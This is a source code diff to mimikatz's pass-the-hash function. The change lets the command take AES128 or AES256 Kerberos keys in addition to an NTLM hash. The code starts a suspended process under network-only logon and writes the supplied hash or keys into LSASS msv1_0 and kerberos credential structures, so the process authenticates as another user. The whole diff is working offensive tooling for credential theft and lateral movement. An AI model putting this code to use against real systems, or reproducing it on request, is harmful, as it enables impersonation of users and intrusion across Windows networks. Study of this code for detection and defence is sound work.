@@ -424,93 +424,96 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
 	TOKEN_STATISTICS tokenStats;
-	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, NULL, NULL, FALSE};
-	PCWCHAR szRun, szNTLM, szAes128, szAes256;
+	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, NULL, FALSE};
+	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
 	DWORD dwNeededSize;
 	HANDLE hToken;
 	PROCESS_INFORMATION processInfos;
 
-	if(kull_m_string_args_byName(argc, argv, L"user", &data.UserName, NULL))
+	if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
-		if(kull_m_string_args_byName(argc, argv, L"domain", &data.LogonDomain, NULL))
+		if(kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		{
+			kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
+			kprintf(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\n", szUser, szDomain, szRun);
+
+
+			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
+			{
+				if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				{
+					if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
+					{
+						data.Aes128Key = aes128key;
+						kprintf(L"AES128\t: "); kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
+					}
+					else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
+				}
+				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1\n");
+			}
+
+			if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
+			{
+				if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				{
+					if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
+					{
+						data.Aes256Key = aes256key;
+						kprintf(L"AES256\t: "); kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
+					}
+					else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
+				}
+				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1\n");
+			}
+
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
 			{
 				if(kull_m_string_stringToHex(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
 				{
-					kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
-					kprintf(L"user\t: %s\ndomain\t: %s\nNTLM\t: ", data.UserName, data.LogonDomain);
-					kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-
-					if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
-					{
-						if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
-						{
-							if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
-							{
-								data.Aes128Key = aes128key;
-								kprintf(L"AES128\t: ");
-								kull_m_string_wprintf_hex(data.Aes128Key, AES_128_KEY_LENGTH, 0); kprintf(L"\n");
-							}
-							else PRINT_ERROR(L"AES128 hash length must be 32 (16 bytes)\n");
-						}
-						else PRINT_ERROR(L"AES128 key only supported from Windows 8.1\n");
-					}
-
-					if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
-					{
-						if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
-						{
-							if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
-							{
-								data.Aes256Key = aes256key;
-								kprintf(L"AES256\t: ");
-								kull_m_string_wprintf_hex(data.Aes256Key, AES_256_KEY_LENGTH, 0); kprintf(L"\n");
-							}
-							else PRINT_ERROR(L"AES256 hash length must be 64 (32 bytes)\n");
-						}
-						else PRINT_ERROR(L"AES256 key only supported from Windows 8.1\n");
-					}
-
-					kprintf(L"Program\t: %s\n", szRun);
-					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, data.UserName, data.LogonDomain, L"", &processInfos, FALSE))
-					{
-						kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
-						if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
-						{
-							if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
-							{
-								kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
-								kprintf(L"  \\_ msv1_0   - ");
-								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
-								kprintf(L"\n");
-								kprintf(L"  \\_ kerberos - ");
-								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
-								kprintf(L"\n");
-							}
-							else PRINT_ERROR_AUTO(L"GetTokenInformation");
-							CloseHandle(hToken);
-						}
-						else PRINT_ERROR_AUTO(L"OpenProcessToken");
-						
-						if(data.isReplaceOk)
-							NtResumeProcess(processInfos.hProcess);
-						else
-							NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
-						
-						CloseHandle(processInfos.hThread);
-						CloseHandle(processInfos.hProcess);
-					}
-					else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+					data.NtlmHash = ntlm;
+					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 				}
 				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
 			}
-			else PRINT_ERROR(L"Missing argument : ntlm\n");
+			else if(!(data.Aes128Key || data.Aes256Key)) PRINT_ERROR(L"Missing argument : ntlm\n");
+			
+			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
+			{
+				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
+				{
+					kprintf(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
+					if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
+					{
+						if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
+						{
+							kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
+							kprintf(L"  \\_ msv1_0   - ");
+							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
+							kprintf(L"\n");
+							kprintf(L"  \\_ kerberos - ");
+							kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
+							kprintf(L"\n");
+						}
+						else PRINT_ERROR_AUTO(L"GetTokenInformation");
+						CloseHandle(hToken);
+					}
+					else PRINT_ERROR_AUTO(L"OpenProcessToken");
+
+					if(data.isReplaceOk)
+						NtResumeProcess(processInfos.hProcess);
+					else
+						NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
+
+					CloseHandle(processInfos.hThread);
+					CloseHandle(processInfos.hProcess);
+				}
+				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
+			}
 		}
 		else PRINT_ERROR(L"Missing argument : domain\n");
 	}
 	else PRINT_ERROR(L"Missing argument : user\n");
-	
+
 	return STATUS_SUCCESS;
 }
 
